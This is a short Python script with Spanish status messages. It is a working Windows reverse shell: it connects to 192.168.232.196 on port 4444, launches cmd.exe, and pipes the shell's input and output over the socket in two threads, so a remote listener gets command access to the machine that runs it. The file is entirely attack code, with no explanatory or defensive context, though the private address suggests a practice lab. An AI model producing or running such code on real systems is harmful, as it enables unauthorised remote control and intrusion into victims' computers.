import os
import socket
import subprocess
import threading

def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()
        else:
            break

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

def main():
    try:
        print("Creando el socket...")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("Intentando conectar...")
        s.connect(("192.168.232.196", 4444))
        print("Conexión establecida.")

        print("Iniciando cmd.exe...")
        p = subprocess.Popen(["cmd"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

        s2p_thread = threading.Thread(target=s2p, args=[s, p])
        s2p_thread.daemon = True
        s2p_thread.start()

        p2s_thread = threading.Thread(target=p2s, args=[s, p])
        p2s_thread.daemon = True
        p2s_thread.start()

        try:
            p.wait()
        except KeyboardInterrupt:
            s.close()

    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
